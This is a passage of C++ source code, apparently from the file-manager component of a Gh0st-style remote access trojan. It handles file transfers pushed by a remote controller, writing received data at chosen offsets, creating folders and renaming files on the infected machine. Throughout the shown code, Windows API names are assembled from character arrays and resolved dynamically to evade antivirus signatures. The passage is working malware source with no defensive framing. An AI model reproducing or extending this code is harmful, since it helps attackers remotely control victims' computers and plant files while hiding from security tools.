	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 提示点什么
		// 如果是续传
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			Gyfunction->my_memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			Gyfunction->my_memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// 覆盖
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// 传送下一个
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			Gyfunction->my_memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	char FBwWp27[] = {'F','i','n','d','C','l','o','s','e','\0'};
	FindCloseT pFindClose=(FindCloseT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp27);
	pFindClose(hFind);

	  char Wffkl08[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	  CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl08);
	HANDLE	hFile = 
		pCreateFileA
		(
		m_strCurrentProcessFileName, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// 需要错误处理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(hFile);

	Send(bToken, sizeof(bToken));
}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// 传输完毕
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE	*pFileSize;
	// 得到数据的偏移
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZE *)lpBuffer;

	// 得到数据在文件中的偏移

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	
	dwBytesToWrite = nSize - 8;
	
	  char Wffkl08[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	  CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl08);
	HANDLE	hFile = 
		pCreateFileA
		(
		m_strCurrentProcessFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
	char Wffkl05[] = {'S','e','t','F','i','l','e','P','o','i','n','t','e','r','\0'};
	SetFilePointerT pSetFilePointer=(SetFilePointerT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl05);
	pSetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int nRet = 0;
		// 写入文件
	char HvnXs02[] = {'W','r','i','t','e','F','i','l','e','\0'};
	WriteFileT pWriteFile=(WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),HvnXs02);
	nRet = pWriteFile
		(
		hFile,
		pData, 
		dwBytesToWrite, 
		&dwBytesWrite,
		NULL
		);
// 	if (nRet <= 0)
// 		printf("文件写入失败");
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(hFile);
	// 为了比较，计数器递增

	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwBytesWrite;
	Gyfunction->my_memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	Gyfunction->my_memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}
void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	Gyfunction->my_memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((char *)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (char *)lpBuffer;
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	LPCTSTR lpNewFileName = lpExistingFileName + plstrlenA(lpExistingFileName) + 1;

	char Wffkl03[] = {'M','o','v','e','F','i','l','e','A','\0'};
	MoveFileAT pMoveFileA=(MoveFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl03);
	pMoveFileA(lpExistingFileName, lpNewFileName);
//	::MoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}
